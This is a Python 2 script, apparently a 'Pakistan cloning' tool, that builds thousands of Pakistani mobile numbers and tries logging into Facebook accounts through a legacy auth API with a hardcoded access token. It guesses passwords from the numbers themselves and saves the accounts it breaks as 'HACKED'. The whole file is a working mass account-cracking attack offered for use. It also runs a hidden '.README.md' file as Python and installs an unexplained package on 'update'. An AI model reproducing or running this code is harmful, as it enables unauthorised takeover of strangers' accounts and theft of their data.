import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(20000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print (nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .README.md')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully'
    os.sys.exit()
    
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
        

os.system('clear')
###LOGO####
logo1 = """

  \033[1;91m_________________      _____   .___ 
 \033[1;92m/   _____/\_____  \    /     \  |   |
\033[1;93m \_____  \  /   |   \  /  \ /  \ |   |
\033[1;94m /        \/    |    \/    Y    \|   |
\033[1;96m/_______  /\_______  /\____|__  /|___|
\033[1;95m        \/         \/         \/      
"""
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo1
    print
    print 47* '\033[1;97m_'
    print
    psb('\x1b[1;95m[\x1b[1;92m1\x1b[1;94m]  \x1b[1;93mPAKISTAN CLONING')
    psb('\x1b[1;95m[\x1b[1;92m2\x1b[1;94m]  \x1b[1;96mUPDATE PROGRAM')
    psb('\x1b[1;95m[\x1b[1;92m0\x1b[1;94m]  \x1b[1;92mSTOP WORKING')
    print
    print 47* '\033[1;97m_'
    print
    star()

def star():
    star = raw_input('\n\n \x1b[1;96m>   ')
    if star == '':
        print '[!] Fill in correctly'
        star()
    elif star == '1':
        os.system("clear")
        print logo1
        print
        try:
            c = raw_input('\033[1;95mTYPE ANY 4 DIGIT NUMBER\n\x1b[1;93mTYPE ANY CODE FROM 00 TO 49 \n\033[1;96mENTER>>>>> ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif star == '2':
        os.system('clear')
        os.system('pip2 install --upgrade Change')
        os.system('clear')
        print logo
        print
        psb(' Tool has been successfully updated')
        time.sleep(1)
        os.system('python2 .README.md')
        menu()
    
    elif star =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47* '\033[1;97m='
    xxx = str(len(id))
    psb('\033[1;97m[+] \033[1;91mTOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('\033[1;97m[\xe2\x9c\x93]\033[1;91m PLEASE WAIT, PROCESS IS START..')
    time.sleep(0.5)
    psb('\033[1;97m[!] \033[1;91mTO STOP THIS PROCESS PRESS Ctrl THEN z')
    time.sleep(0.5)
    print 47* '\033[1;97m='
    print

    def main(arg):
    	global oks
        global cpb
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;94m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;93m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user 
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data) 
                if 'access_token' in q:
                    print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;94m[AFTER 7DAYS] \x1b[1;92m  ' + k + c + user + '\x1b[1;94m | \x1b[1;93m' + pass2 + '\n'
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
  
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')
    
if __name__ == '__main__':
    menu()
